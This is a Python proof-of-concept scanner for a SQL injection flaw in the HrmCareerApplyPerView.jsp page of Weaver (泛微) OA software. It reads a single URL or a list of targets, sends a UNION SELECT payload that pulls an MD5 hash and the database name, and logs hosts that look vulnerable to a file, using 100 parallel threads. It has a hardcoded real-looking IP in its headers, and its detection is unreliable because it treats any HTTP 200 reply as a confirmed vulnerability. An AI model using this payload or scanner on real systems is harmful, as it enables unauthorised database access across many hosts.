#泛微 HrmCareerApplyPerView S Q L 注入漏洞
import requests,sys,argparse,re,json
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
     test="""  _    _                 _____                         
 | |  | |               / ____|                        
 | |__| |_ __ _ __ ___ | |     __ _ _ __ ___  ___ _ __ 
 |  __  | '__| '_ ` _ \| |    / _` | '__/ _ \/ _ \ '__|
 | |  | | |  | | | | | | |___| (_| | | |  __/  __/ |   
 |_|  |_|_|  |_| |_| |_|\_____\__,_|_|  \___|\___|_|   
                                             author:CHKer
                                             version:1.0.0          
                                                       

 """
     print(test)

def main():
    banner()
    parsers=argparse.ArgumentParser(description='泛微 HrmCareerApplyPerView S Q L 注入漏洞')
    parsers.add_argument('-u','--url',dest='url',type=str,help='please input your url')
    parsers.add_argument('-f','--file',dest='file',type=str,help='please input your filepath')
    args=parsers.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp=Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"usag:\n\t python {sys.argv[0]} -h")
def poc(target):
    payload='/pweb/careerapply/HrmCareerApplyPerView.jsp?id=1%20union%20select%201,2,sys.fn_sqlvarbasetostr(HashBytes(%27MD5%27,%27abc%27)),db_name(1),5,6,7'
    headers = {
        'User-Agent':'Mozilla/5.0(WindowsNT10.0;Win64;x64;rv:128.0)Gecko/20100101Firefox/128.0',
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
        'Accept-Language':'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding':'gzip,deflate',
        'Referer':'http://113.220.233.91:8088/',
        'Connection':'close',
        'Upgrade-Insecure-Requests':'1',
        'If-Modified-Since':'Tue,26May202008:04:48GMT',
        'If-None-Match':'"/ihGApzzc7C"',
        'Priority':'u=0,i',
    }


    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }
   
    try:
        res1=requests.post(url=target+payload,headers=headers,proxies=proxies,verify=False)
        if res1.status_code==200:
                    print(f"[+]目标存在 {target}")
                    with open('result32.txt','a') as f:
                        f.write(target+'\n')
        else:
             print(f'[-]目标不存在漏洞 {target}')
    except:
        pass


if __name__ == '__main__':
    main()
